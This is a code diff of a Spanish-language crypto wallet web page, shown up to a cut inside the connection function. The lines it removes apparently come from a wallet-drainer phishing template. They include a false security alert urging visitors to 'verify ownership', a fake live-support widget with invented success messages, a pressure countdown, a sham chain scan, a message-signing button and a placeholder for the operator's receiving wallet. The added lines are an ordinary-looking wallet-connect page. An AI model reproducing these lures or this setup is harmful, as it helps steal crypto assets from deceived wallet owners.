@@ -2,1018 +2,978 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Web3 Verify | Secure Asset Recovery</title>
-
-<!-- Google Fonts -->
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
-
-<!-- Icons -->
-<script src="https://unpkg.com/lucide@latest"></script>
-
-<!-- Core Library -->
-<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web3 Universal Connect</title>
+<script src="https://cdn.ethers.io/lib/ethers-5.7.2.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 <style>
-:root {
- --bg-dark: #09090b;
- --bg-card: rgba(255, 255, 255, 0.03);
- --border-color: rgba(255, 255, 255, 0.08);
- --primary: #3b82f6;
- --primary-hover: #2563eb;
- --success: #22c55e;
- --text-main: #f4f4f5;
- --text-muted: #a1a1aa;
- --font-main: 'Inter', sans-serif;
- --font-mono: 'JetBrains Mono', monospace;
-}
+  :root {
+    --primary: #6d4aff;
+    --accent: #00ff9d;
+    --bg: #0f1117;
+    --card: #1a1d26;
+    --border: #2b3142;
+    --text: #ffffff;
+    --muted: #8b93a7;
+  }
 
-* { box-sizing: border-box; outline: none; }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
 
-body { 
- margin: 0; 
- font-family: var(--font-main); 
- background-color: var(--bg-dark); 
- color: var(--text-main); 
- display: flex; 
- justify-content: center; 
- align-items: center; 
- min-height: 100vh; 
- background-image: radial-gradient(circle at top right, #1e293b 0%, transparent 40%),
- radial-gradient(circle at bottom left, #1e293b 0%, transparent 40%);
-}
+  body {
+    font-family: 'Inter', system-ui, -apple-system, sans-serif;
+    background: linear-gradient(135deg, var(--bg) 0%, #151025 100%);
+    color: var(--text);
+    min-height: 100vh;
+    padding: 1rem;
+  }
 
-/* CONTAINER PRINCIPAL */
-.container { 
- text-align: center; 
- max-width: 420px; 
- width: 94%; 
- padding: 32px 24px; 
- background: var(--bg-card); 
- backdrop-filter: blur(12px);
- -webkit-backdrop-filter: blur(12px);
- border-radius: 16px; 
- border: 1px solid var(--border-color);
- box-shadow: 0 20px 40px rgba(0,0,0,0.4); 
- position: relative;
- z-index: 10;
-}
+  /* Header */
+  .header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 1rem;
+    margin-bottom: 1.5rem;
+  }
 
-/* HEADER */
-header {
- display: flex;
- justify-content: space-between;
- align-items: center;
- margin-bottom: 24px;
- padding-bottom: 16px;
- border-bottom: 1px solid var(--border-color);
-}
+  .logo {
+    font-size: 1.4rem;
+    font-weight: 800;
+    background: linear-gradient(90deg, var(--primary), #b88bff);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+  }
 
-.logo-area {
- display: flex;
- align-items: center;
- gap: 8px;
- font-weight: 700;
- font-size: 1.1rem;
- letter-spacing: -0.02em;
-}
+  .status-badge {
+    background: rgba(0, 255, 157, 0.1);
+    color: var(--accent);
+    padding: 0.4rem 0.8rem;
+    border-radius: 20px;
+    font-size: 0.75rem;
+    font-weight: 700;
+    text-transform: uppercase;
+    border: 1px solid rgba(0, 255, 157, 0.3);
+  }
 
-.logo-icon {
- background: linear-gradient(135deg, #3b82f6, #8b5cf6);
- padding: 6px;
- border-radius: 6px;
-}
+  /* Main Container */
+  .container {
+    max-width: 500px;
+    margin: 0 auto;
+  }
 
-/* TYPOGRAPHY */
-h1 { 
- font-size: 1.5rem; 
- margin: 0 0 12px 0; 
- color: var(--text-main);
- line-height: 1.2;
-}
+  /* Hero */
+  .hero {
+    text-align: center;
+    margin-bottom: 2rem;
+  }
 
-p.subtitle { 
- color: var(--text-muted); 
- font-size: 0.9rem; 
- margin: 0 0 24px 0; 
- line-height: 1.5;
-}
+  .hero h1 {
+    font-size: clamp(1.5rem, 5vw, 2rem);
+    margin-bottom: 0.5rem;
+  }
 
-/* ASSET LIST STYLES */
-.asset-list {
- text-align: left;
- background: rgba(0,0,0,0.2);
- border-radius: 8px;
- padding: 12px;
- margin-bottom: 20px;
- border: 1px solid var(--border-color);
- display: none; /* Hidden by default until scanned */
-}
+  .hero p {
+    color: var(--muted);
+    font-size: 0.9rem;
+    line-height: 1.5;
+  }
 
-.asset-item {
- display: flex;
- justify-content: space-between;
- font-size: 0.85rem;
- padding: 6px 0;
- border-bottom: 1px solid rgba(255,255,255,0.05);
-}
-.asset-item:last-child { border-bottom: none; }
-.asset-name { color: var(--text-muted); }
-.asset-val { color: var(--text-main); font-weight: 500; }
+  /* Panel Styles */
+  .panel {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    padding: 1.5rem;
+    margin-bottom: 1.5rem;
+  }
 
-/* BUTTONS */
-.btn { 
- background: var(--primary); 
- border: none; 
- padding: 14px 24px; 
- color: white; 
- border-radius: 10px; 
- cursor: pointer; 
- font-weight: 600; 
- width: 100%; 
- font-size: 1rem; 
- transition: all 0.2s ease;
- display: flex;
- align-items: center;
- justify-content: center;
- gap: 8px;
- box-shadow: 0 4px 12px rgba(59, 130, 246, 0.25);
-}
+  .panel-title {
+    font-size: 0.85rem;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    color: var(--muted);
+    margin-bottom: 1rem;
+  }
 
-.btn:hover:not(:disabled) { 
- background: var(--primary-hover); 
- transform: translateY(-1px);
-}
+  /* Wallet Options */
+  .wallet-list {
+    display: flex;
+    flex-direction: column;
+    gap: 0.75rem;
+  }
 
-.btn:active:not(:disabled) { transform: translateY(0); }
+  .wallet-btn {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    width: 100%;
+    padding: 1rem;
+    background: #1f2330;
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    cursor: pointer;
+    transition: all 0.2s;
+    color: var(--text);
+    text-decoration: none;
+  }
 
-.btn:disabled { 
- background: #334155; 
- color: #94a3b8; 
- cursor: not-allowed; 
- box-shadow: none;
-}
+  .wallet-btn:hover:not(:disabled) {
+    border-color: var(--primary);
+    transform: translateY(-1px);
+  }
 
-/* STATUS & LOGS */
-.status { 
- margin-top: 16px; 
- font-size: 0.9rem; 
- min-height: 24px; 
- color: #fbbf24; 
- font-weight: 500;
- display: flex;
- align-items: center;
- justify-content: center;
- gap: 6px;
-}
+  .wallet-btn:disabled {
+    opacity: 0.4;
+    cursor: not-allowed;
+  }
 
-#logs { 
-text-align: left; 
-background: #000000; 
-padding: 12px; 
-border-radius: 8px; 
-font-family: var(--font-mono); 
-font-size: 0.7rem; 
-color: #4ade80; 
-max-height: 120px; 
-overflow-y: auto; 
-margin-top: 16px; 
-display: none; 
-border: 1px solid #1e293b;
-scrollbar-width: thin;
-scrollbar-color: #333 transparent;
-}
+  .wallet-icon {
+    width: 40px;
+    height: 40px;
+    border-radius: 10px;
+    background: var(--primary);
+    display: grid;
+    place-items: center;
+    font-size: 1.2rem;
+    flex-shrink: 0;
+  }
 
-#logs div { margin-bottom: 4px; word-break: break-all; }
-#logs::-webkit-scrollbar { width: 4px; }
-#logs::-webkit-scrollbar-thumb { background: #333; border-radius: 2px; }
+  .wallet-info {
+    flex: 1;
+    min-width: 0;
+  }
 
-.timer { 
- font-size: 0.8rem; 
- color: #ef4444; 
- margin-top: 12px; 
- font-weight: 500;
- opacity: 0.8;
-}
+  .wallet-name {
+    font-weight: 600;
+    font-size: 0.95rem;
+    display: block;
+  }
 
-/* SCANNER ANIMATION */
-.scanner-box {
- height: 40px;
- display: flex;
- align-items: center;
- justify-content: center;
- margin-bottom: 16px;
- opacity: 0;
- transition: opacity 0.3s;
-}
-.scanner-active { opacity: 1; }
+  .wallet-desc {
+    font-size: 0.75rem;
+    color: var(--muted);
+    margin-top: 0.2rem;
+  }
 
-.spinner {
- width: 16px;
- height: 16px;
- border: 2px solid rgba(255,255,255,0.1);
- border-top-color: var(--primary);
- border-radius: 50%;
- animation: spin 1s linear infinite;
- margin-right: 8px;
-}
+  .wallet-status {
+    font-size: 0.75rem;
+    color: var(--accent);
+  }
 
-@keyframes spin { to { transform: rotate(360deg); } }
+  .wallet-status.not-installed {
+    color: var(--muted);
+  }
 
-/* MODAL MOVIL */
-.mobile-modal { 
- display: none; 
- position: fixed; 
- top: 0; 
- left: 0; 
- width: 100%; 
- height: 100%; 
- background: rgba(0,0,0,0.9); 
- backdrop-filter: blur(5px);
- z-index: 1000; 
- justify-content: center; 
- align-items: center; 
-}
+  /* QR Section */
+  .qr-container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 1rem;
+  }
 
-.modal-content { 
- background: #1f2937; 
- padding: 24px; 
- border-radius: 16px; 
- text-align: center; 
- width: 85%; 
- max-width: 320px; 
- border: 1px solid #374151;
- box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5);
-}
+  #qrcode {
+    background: #fff;
+    padding: 1rem;
+    border-radius: 12px;
+  }
 
-.modal-btn { 
- background: var(--primary); 
- margin-top: 15px; 
-}
+  #qrcode img {
+    display: block;
+  }
 
-.modal-btn.secondary {
- background: transparent;
- border: 1px solid #4b5563;
- color: var(--text-muted);
-}
-.modal-btn.secondary:hover { background: rgba(255,255,255,0.05); color: white; }
+  .qr-instructions {
+    font-size: 0.8rem;
+    color: var(--muted);
+    text-align: center;
+    line-height: 1.5;
+  }
 
-/* CHAT WIDGET */
-.chat-widget {
- position: fixed;
- bottom: 20px;
- right: 20px;
- background: #1f2937;
- border: 1px solid #374151;
- border-radius: 12px;
- padding: 12px 16px;
- width: 260px;
- box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
- z-index: 50;
- opacity: 0;
- transform: translateY(20px);
- transition: all 0.5s ease;
- pointer-events: none;
-}
+  /* Connection Status */
+  .connection-panel {
+    display: none;
+  }
 
-.chat-visible {
- opacity: 1;
- transform: translateY(0);
- pointer-events: auto;
-}
+  .connection-panel.active {
+    display: block;
+  }
 
-.chat-header {
- display: flex;
- align-items: center;
- gap: 8px;
- font-size: 0.8rem;
- font-weight: 600;
- margin-bottom: 8px;
- color: var(--text-muted);
-}
+  .address-display {
+    font-family: ui-monospace, monospace;
+    background: rgba(109, 76, 255, 0.15);
+    padding: 0.8rem;
+    border-radius: 8px;
+    font-size: 0.8rem;
+    word-break: break-all;
+    text-align: center;
+    margin-bottom: 1rem;
+  }
 
-.chat-msg {
- font-size: 0.85rem;
- background: rgba(255,255,255,0.05);
- padding: 8px 12px;
- border-radius: 8px;
- border-top-left-radius: 2px;
- color: var(--text-main);
-}
+  .balance-display {
+    text-align: center;
+    font-size: 2rem;
+    font-weight: 700;
+    color: var(--accent);
+    margin-bottom: 0.5rem;
+  }
 
-/* UTILS */
-.hidden { display: none !important; }
-.fade-in { animation: fadeIn 0.5s ease forwards; }
+  .network-tag {
+    display: inline-block;
+    background: rgba(0, 255, 157, 0.15);
+    padding: 0.3rem 0.7rem;
+    border-radius: 6px;
+    font-size: 0.75rem;
+    color: var(--accent);
+    margin-bottom: 1rem;
+  }
 
-@keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+  /* Action Buttons */
+  .actions {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 0.75rem;
+    margin-top: 1rem;
+  }
 
+  .action-btn {
+    padding: 0.8rem;
+    background: #1f2330;
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    cursor: pointer;
+    color: var(--text);
+    font-size: 0.85rem;
+    transition: all 0.2s;
+  }
+
+  .action-btn:hover {
+    border-color: var(--primary);
+  }
+
+  .disconnect-btn {
+    grid-column: span 2;
+    background: rgba(231, 76, 60, 0.1);
+    border-color: rgba(231, 76, 60, 0.3);
+    color: #e74c3c;
+  }
+
+  /* Toast Messages */
+  .toast {
+    position: fixed;
+    bottom: 2rem;
+    left: 50%;
+    transform: translateX(-50%) translateY(100px);
+    background: var(--card);
+    border: 1px solid var(--border);
+    padding: 1rem 1.5rem;
+    border-radius: 10px;
+    z-index: 1000;
+    transition: transform 0.3s;
+    font-size: 0.9rem;
+  }
+
+  .toast.show {
+    transform: translateX(-50%) translateY(0);
+  }
+
+  .toast.success { border-color: var(--accent); }
+  .toast.error { border-color: #e74c3c; }
+
+  /* Responsive */
+  @media (max-width: 480px) {
+    .actions { grid-template-columns: 1fr; }
+    .disconnect-btn { grid-column: span 1; }
+  }
+
+  /* Loading Spinner */
+  .spinner {
+    width: 20px;
+    height: 20px;
+    border: 2px solid var(--border);
+    border-top-color: var(--primary);
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+  }
+
+  @keyframes spin {
+    to { transform: rotate(360deg); }
+  }
+
+  /* Hidden class */
+  .hidden { display: none !important; }
 </style>
 </head>
 <body>
 
-<!-- WIDGET DE CHAT FALSO -->
-<div id="chatWidget" class="chat-widget">
-<div class="chat-header">
-<i data-lucide="message-square" style="width:14px; height:14px;"></i>
-Live Support
-</div>
-<div class="chat-msg">
-User_882 just verified successfully! ✅
-</div>
+<!-- Header -->
+<div class="header">
+  <div class="logo">🌐 Web3Connect</div>
+  <div id="statusBadge" class="status-badge">Desconectado</div>
 </div>
 
-<div class="container fade-in">
-<!-- HEADER -->
-<header>
-<div class="logo-area">
-<div class="logo-icon">
-<i data-lucide="shield-check" style="color:white; width:18px; height:18px;"></i>
+<div class="container">
+
+  <!-- Connected State Panel -->
+  <div id="connectedPanel" class="panel connection-panel">
+    <div class="panel-title">Estado de Conexión</div>
+    
+    <div class="balance-display" id="balanceDisplay">0.0000</div>
+    <div id="ethUsd" style="text-align:center; color:var(--muted); font-size:0.8rem;"></div>
+    <div style="text-align:center;">
+      <span id="networkTag" class="network-tag">-</span>
+    </div>
+    
+    <div class="address-display" id="addressDisplay">0x...</div>
+    <div style="text-align:center; font-size:0.8rem; color:var(--muted);" id="walletNameDisplay">Wallet</div>
+    
+    <div class="actions">
+      <button class="action-btn" onclick="copyAddress()">📋 Copiar</button>
+      <button class="action-btn" onclick="viewExplorer()">🔍 Explorar</button>
+      <button class="action-btn" onclick="signMessage()">✍️ Firmar</button>
+      <button class="action-btn" onclick="switchNetwork()">🔄 Cambiar Red</button>
+      <button class="action-btn disconnect-btn" onclick="disconnect()">🔓 Desconectar</button>
+    </div>
+  </div>
+
+  <!-- Disconnect Panel (shown when connected) -->
+  <div id="disconnectPanel" class="panel hidden">
+    <div class="panel-title">Tu Dirección</div>
+    <div class="address-display" id="displayAddress">0x...</div>
+  </div>
+
+  <!-- Wallet Selection Panel -->
+  <div id="selectPanel" class="panel">
+    <div class="panel-title">Selecciona tu Wallet</div>
+    
+    <div id="walletList" class="wallet-list">
+      <!-- Wallets inserted dynamically -->
+    </div>
+  </div>
+
+  <!-- QR Code Panel for Desktop -->
+  <div id="qrPanel" class="panel">
+    <div class="panel-title">Desde PC: Escanea con tu App Móvil</div>
+    
+    <div class="qr-container">
+      <div id="qrcode"></div>
+      <p class="qr-instructions">
+        Abre MetaMask, TrustWallet, Coinbase o Rainbow en tu móvil<br>
+        y escanea este código QR para conectar
+      </p>
+    </div>
+  </div>
+
+  <!-- Info Footer -->
+  <div class="panel">
+    <div class="panel-title">Soporte</div>
+    <div class="wallet-list">
+      <div style="font-size:0.85rem; color:var(--muted);">
+        <strong>PC:</strong> MetaMask, Rabby, Coinbase Wallet, Brave Wallet, Rabby<br><br>
+        <strong>Móvil (abre en app):</strong> MetaMask, TrustWallet, Coinbase Wallet, Rainbow, Argent, imToken<br><br>
+        🔒 Conexión directa. Tus claves nunca salen de tu wallet.<br>
+        🚫 No requerimos registro ni servidor centralizado.
+      </div>
+    </div>
+  </div>
+
 </div>
-<span>Web3 Verify</span>
-</div>
-</header>
 
-<!-- CONTENIDO PRINCIPAL -->
-<h1>🔒 Wallet Security Verified</h1>
-<p class="subtitle">
-We detected a potential security risk in your transaction history. To restore full access to your assets, please verify ownership.
-</p>
-
-<!-- ESTADO DE CONEXIÓN -->
-<button id="connectBtn" class="btn">
-<i data-lucide="wallet" style="width:18px; height:18px;"></i>
-Connect Wallet
-</button>
-
-<!-- ZONA DE ESCANEO Y ACTIVOS (Oculto inicialmente) -->
-<div id="scanArea" class="hidden">
-<div class="scanner-box scanner-active" id="scannerAnim">
-<div class="spinner"></div>
-<span style="font-size:0.85rem; color:#94a3b8;">Scanning EVM Chains...</span>
-</div>
-
-<div class="asset-list" id="assetList">
-<!-- Los activos se llenarán dinámicamente aquí -->
-</div>
-</div>
-
-<!-- BOTÓN DE ACCIÓN FINAL -->
-<button id="verifyBtn" class="btn hidden" style="background: #22c55e; box-shadow: 0 4px 12px rgba(34, 197, 94, 0.25);">
-<i data-lucide="signature" style="width:18px; height:18px;"></i>
-Sign Message to Verify
-</button>
-
-<div style="margin-top:8px; font-size:0.8rem; color:#94a3b8; display:none;" id="costInfo">
-Cost: 0 Gas | Time: < 2s
-</div>
-
-<div id="status" class="status"></div>
-<div id="timer" class="timer">Claiming closes in: 15:00</div>
-
-<div id="logs"></div>
-</div>
-
-<!-- MODAL PARA MOBILE FALLBACK -->
-<div id="mobileModal" class="mobile-modal">
-<div class="modal-content">
-<div style="margin-bottom:15px; color:#3b82f6;"><i data-lucide="smartphone" style="width:40px; height:40px;"></i></div>
-<h3 id="modalTitle" style="margin:0 0 10px 0; font-size:1.1rem;">Wallet Detected</h3>
-<p id="modalText" style="color:#9ca3af; font-size:0.9rem; margin:0 0 20px 0;">Para continuar, por favor abre tu aplicación.</p>
-
-<button id="openAppBtn" class="btn modal-btn">Abrir App</button>
-<button id="confirmOpenBtn" class="btn modal-btn secondary" style="margin-top:10px;">Ya está abierto / Conectar</button>
-</div>
-</div>
+<!-- Toast -->
+<div id="toast" class="toast"></div>
 
 <script>
-// ==========================================
-// CONFIGURACIÓN
-// ==========================================
+/* ============================================================
+   CONFIGURACIÓN
+   ============================================================ */
+const CONFIG = {
+  chains: {
+    1: { name: 'Ethereum', explorer: 'https://etherscan.io' },
+    5: { name: 'Goerli', explorer: 'https://goerli.etherscan.io' },
+    137: { name: 'Polygon', explorer: 'https://polygonscan.com' },
+    80001: { name: 'Mumbai', explorer: 'https://mumbai.polygonscan.com' },
+    42161: { name: 'Arbitrum', explorer: 'https://arbiscan.io' },
+    10: { name: 'Optimism', explorer: 'https://optimistic.etherscan.io' },
+    56: { name: 'BNB Chain', explorer: 'https://bscscan.com' }
+  },
+  priceApi: 'https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd',
+  domain: location.hostname
+};
 
-// 1. CAMBIA ESTO POR TU WALLET
-const TARGET_WALLET = "TU_WALLET_AQUI"; 
+/* ============================================================
+   ESTADO GLOBAL
+   ============================================================ */
+const state = {
+  provider: null,
+  accounts: [],
+  chainId: null,
+  walletName: null,
+  signer: null,
+  web3: null
+};
 
-let provider;
-let signer;
-let userAddress;
-let currentChainId;
-let detectedWalletType = 'unknown';
+/* ============================================================
+   DEEP LINKS PARA CADA WALLET
+   ⚠️ Estos formatos pueden cambiar - verifique documentación
+   ============================================================ */
+const DEEP_LINKS = {
+  metamask: {
+    name: 'MetaMask',
+    icon: '🦊',
+    scheme: 'https://metamask.app.link/dapp/{full}',
+    installedCheck: () => typeof window.metamask !== 'undefined'
+  },
+  trustwallet: {
+    name: 'TrustWallet',
+    icon: '🛡️',
+    scheme: 'https://link.trustwallet.com/open_url?coin_id=60&url={full}',
+    installedCheck: () => window.location.href.startsWith('https://link.trustwallet.com') === false && 
+                         window.ethereum?.isTrust === true
+  },
+  coinbase: {
+    name: 'Coinbase Wallet',
+    icon: '💎',
+    scheme: 'https://go.cb-w.com/dapp?cb_url={full}',
+    installedCheck: () => typeof window.coinbaseWalletExtension !== 'undefined'
+  },
+  rainbow: {
+    name: 'Rainbow',
+    icon: '🌈',
+    scheme: 'https://rnbwapp.com/?uri={full}',
+    installedCheck: () => window.ethereum?.isRainbow === true
+  },
+  argent: {
+    name: 'Argent',
+    icon: '⚡',
+    scheme: 'https://www.argent.xyz/argent-dapp?url={full}',
+    installedCheck: () => window.ethereum?.isArgent === true
+  },
+  imtoken: {
+    name: 'imToken',
+    icon: '📱',
+    scheme: 'imtoken://dapp?link={full}',
+    installedCheck: () => window.ethereum?.isImToken === true
+  },
+  zerion: {
+    name: 'Zerion',
+    icon: '🎯',
+    scheme: 'https://app.zerion.io/dapp?url={full}',
+    installedCheck: () => window.ethereum?.isZerion === true
+  }
+};
 
-// ELEMENTOS DOM
-const connectBtn = document.getElementById('connectBtn');
-const verifyBtn = document.getElementById('verifyBtn');
-const statusDiv = document.getElementById('status');
-const logsDiv = document.getElementById('logs');
-const mobileModal = document.getElementById('mobileModal');
-const openAppBtn = document.getElementById('openAppBtn');
-const confirmOpenBtn = document.getElementById('confirmOpenBtn');
-const scanArea = document.getElementById('scanArea');
-const assetList = document.getElementById('assetList');
-const costInfo = document.getElementById('costInfo');
-const chatWidget = document.getElementById('chatWidget');
-const modalTitle = document.getElementById('modalTitle');
-const modalText = document.getElementById('modalText');
-
-// UTILIDAD: LOGS
-function log(msg) {
- logsDiv.style.display = 'block';
- const p = document.createElement('div');
- p.textContent = `> ${msg}`;
- logsDiv.appendChild(p);
- logsDiv.scrollTop = logsDiv.scrollHeight;
+/* ============================================================
+   UTILIDADES
+   ============================================================ */
+function getFullUrl() {
+  return encodeURIComponent(location.href);
 }
 
-// UTILIDAD: FORMATEO DE RED
-function getNetworkName(chainId) {
- switch(chainId) {
- case 1: return "Ethereum";
- case 56: return "BSC";
- case 137: return "Polygon";
- case 42161: return "Arbitrum";
- case 10: return "Optimism";
- case 43114: return "Avalanche";
- case 199: return "BitTorrent";
- default: return "Unknown";
- }
+function truncateAddress(addr) {
+  if (!addr) return '';
+  return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
 }
 
-// INICIAR TIMER
-let timeLeft = 900; 
-setInterval(() => {
- if(timeLeft <= 0) return;
- timeLeft--;
- let m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
- let s = (timeLeft % 60).toString().padStart(2, '0');
- document.getElementById('timer').textContent = `Claiming closes in: ${m}:${s}`;
-}, 1000);
-
-// DETECCIÓN DE DISPOSITIVO
-function isMobile() {
- return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth < 768;
+function showToast(message, type = 'info') {
+  const toast = document.getElementById('toast');
+  toast.textContent = message;
+  toast.className = `toast show ${type}`;
+  setTimeout(() => toast.classList.remove('show'), 4000);
 }
 
-// DETECCIÓN DE WALLET
-function detectWallet() {
- if (window.ethereum?.isTrust) {
- detectedWalletType = 'trust';
- return 'trust';
- }
- if (window.ethereum?.isMetaMask) {
- detectedWalletType = 'metamask';
- return 'metamask';
- }
- if (window.ethereum?.isCoinbaseWallet) {
- detectedWalletType = 'coinbase';
- return 'coinbase';
- }
- return 'unknown';
+function escapeHtml(text) {
+  const div = document.createElement('div');
+  div.textContent = text;
+  return div.innerHTML;
 }
 
-// LÓGICA DE CONEXIÓN MEJORADA PARA MÓVIL
-connectBtn.addEventListener('click', async () => {
- if (!window.ethereum) {
- statusDiv.textContent = "Instala tu wallet primero.";
- return;
- }
+/* ============================================================
+   DETECCIÓN EIP-6963 (Multi-Wallet Discovery)
+   ============================================================ */
+async function discoverProviders() {
+  const providers = new Map();
 
- // Detectar qué wallet es para ajustar textos
- detectWallet();
+  // Listener para anuncios EIP-6963
+  window.addEventListener('eip6963:announceProvider', (event) => {
+    const { info, provider } = event.detail;
+    if (!providers.has(info.uuid)) {
+      providers.set(info.uuid, { info, provider });
+      renderWalletButtons();
+    }
+  });
 
- if (isMobile()) {
- // Solo mostramos modal si estamos en Trust Wallet o MetaMask Mobile dentro del navegador
- // Si ya tenemos window.ethereum, podemos intentar conectar directo
- if (detectedWalletType === 'trust' && !window.ethereum.isTrust) {
- // Estamos en el navegador externo (Chrome/Safari) pero tenemos Trust instalado
- modalTitle.textContent = "Trust Wallet Detected";
- modalText.textContent = "Para verificar tus activos, abriremos el navegador interno o conectaremos directamente.";
- 
- openAppBtn.onclick = () => {
- // Forzar apertura en Trust Browser usando Deep Link Universal
- window.open('https://link.trustwallet.org/open_url?chain_id=56&url=' + encodeURIComponent(window.location.href));
- tryConnect(); 
- };
- } else if (detectedWalletType === 'metamask' && !window.ethereum.isMetaMask) {
- // MetaMask en navegador externo (ej. Chrome)
- modalTitle.textContent = "MetaMask Detected";
- modalText.textContent = "Abre la app para confirmar la conexión.";
- openAppBtn.onclick = () => {
- window.open('https://metamask.app.link/dapp/' + window.location.host);
- tryConnect();
- };
- } else {
- // MetaMask o Trust ya conectado (dentro de su browser)
- modalTitle.textContent = "Mobile Wallet Connected";
- modalText.textContent = "Presiona 'Conectar' para iniciar el escaneo de seguridad.";
- openAppBtn.onclick = () => {
- mobileModal.style.display = 'none';
- tryConnect();
- };
- }
+  // Solicitar anuncios
+  const announce = () => window.dispatchEvent(new Event('eip6963:requestProvider'));
+  announce();
+  setTimeout(announce, 300);
+  setTimeout(announce, 1000);
 
- mobileModal.style.display = 'flex';
- confirmOpenBtn.addEventListener('click', () => {
- mobileModal.style.display = 'none';
- tryConnect();
- });
- return; 
- }
+  return providers;
+}
 
- // En Desktop, simplemente conectamos
- try {
- await tryConnect();
- } catch (err) {
- console.error(err);
- statusDiv.textContent = "Error de conexión.";
- }
+/* ============================================================
+   RENDERIZADO DE BOTONES
+   ============================================================ */
+async function renderWalletButtons() {
+  const list = document.getElementById('walletList');
+  list.innerHTML = '';
+
+  // 1. Extensiones detectadas (EIP-6963 y legacy)
+  const detected = await getDetectedProviders();
+  
+  detected.forEach(({ name, icon, provider, isInstalled }) => {
+    const btn = document.createElement('button');
+    btn.className = 'wallet-btn';
+    btn.innerHTML = `
+      <span class="wallet-icon">${icon}</span>
+      <span class="wallet-info">
+        <span class="wallet-name">${escapeHtml(name)}</span>
+        <span class="wallet-desc">${isInstalled ? 'Detectada en este dispositivo' : 'Abrir en app'}</span>
+      </span>
+      ${isInstalled ? '<span class="wallet-status">✓ Instalado</span>' : '<span class="wallet-status not-installed">→ Abrir</span>'}
+    `;
+    btn.onclick = () => connectToWallet(provider || name);
+    list.appendChild(btn);
+  });
+
+  // 2. Botones para abrir en app móvil (si no detectamos extensiones o estamos en móvil)
+  const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+  const mobileOnly = detected.length === 0 || isMobile;
+
+  if (mobileOnly) {
+    Object.entries(DEEP_LINKS).forEach(([key, wallet]) => {
+      const btn = document.createElement('a');
+      btn.className = 'wallet-btn';
+      btn.href = wallet.scheme.replace('{full}', getFullUrl());
+      btn.rel = 'noopener';
+      
+      // Intentar detectar si está instalado
+      const isInstalled = wallet.installedCheck?.() || false;
+      
+      btn.innerHTML = `
+        <span class="wallet-icon">${wallet.icon}</span>
+        <span class="wallet-info">
+          <span class="wallet-name">${escapeHtml(wallet.name)}</span>
+          <span class="wallet-desc">${isInstalled ? 'Detectada' : 'Abrir en app'}</span>
+        </span>
+        ${isInstalled ? '<span class="wallet-status">✓ Disponible</span>' : '<span class="wallet-status not-installed">↘ Descargar</span>'}
+      `;
+      list.appendChild(btn);
+    });
+  }
+}
+
+/* ============================================================
+   OBTENER PROVIDERS DETECTADOS
+   ============================================================ */
+async function getDetectedProviders() {
+  const providers = [];
+  
+  // EIP-6963
+  const announcementEvent = new Event('eip6963:requestProvider');
+  window.dispatchEvent(announcementEvent);
+  
+  // Legacy window.ethereum
+  if (window.ethereum) {
+    const eth = window.ethereum;
+    
+    // Array de providers (ej: Metamask con múltiples cuentas)
+    if (Array.isArray(eth.providers) && eth.providers.length > 0) {
+      eth.providers.forEach((provider, idx) => {
+        providers.push({
+          name: provider.isMetaMask ? 'MetaMask' : 
+                provider.isRabby ? 'Rabby' :
+                provider.isCoinbaseWallet ? 'Coinbase Wallet' :
+                provider.isBraveWallet ? 'Brave Wallet' : `Wallet ${idx + 1}`,
+          icon: provider.isMetaMask ? '🦊' :
+                provider.isRabby ? '🐰' :
+                provider.isCoinbaseWallet ? '💎' :
+                provider.isBraveWallet ? '🦁' : '🔌',
+          provider,
+          isInstalled: true
+        });
+      });
+    } else {
+      // Single provider
+      const name = eth.isMetaMask ? 'MetaMask' :
+                   eth.isRabby ? 'Rabby' :
+                   eth.isCoinbaseWallet ? 'Coinbase Wallet' :
+                   eth.isBraveWallet ? 'Brave Wallet' :
+                   eth.isTrust ? 'TrustWallet' :
+                   eth.isRainbow ? 'Rainbow' :
+                   eth.isArgent ? 'Argent' : 'Wallet';
+      const icon = eth.isMetaMask ? '🦊' :
+                   eth.isRabby ? '🐰' :
+                   eth.isCoinbaseWallet ? '💎' :
+                   eth.isBraveWallet ? '🦁' :
+                   eth.isTrust ? '🛡️' :
+                   eth.isRainbow ? '🌈' :
+                   eth.isArgent ? '⚡' : '🔌';
+      
+      providers.push({ name, icon, provider, isInstalled: true });
+    }
+  }
+
+  // Eliminar duplicados
+  const unique = [];
+  const seen = new Set();
+  providers.forEach(p => {
+    if (!seen.has(p.name)) {
+      seen.add(p.name);
+      unique.push(p);
+    }
+  });
+
+  return unique;
+}
+
+/* ============================================================
+   CONEXIÓN A WALLET
+   ============================================================ */
+async function connectToWallet(providerOrName) {
+  try {
+    let provider;
+    let walletName;
+
+    if (typeof providerOrName === 'object') {
+      provider = providerOrName;
+      walletName = provider.isMetaMask ? 'MetaMask' : 
+                   provider.isRabby ? 'Rabby' :
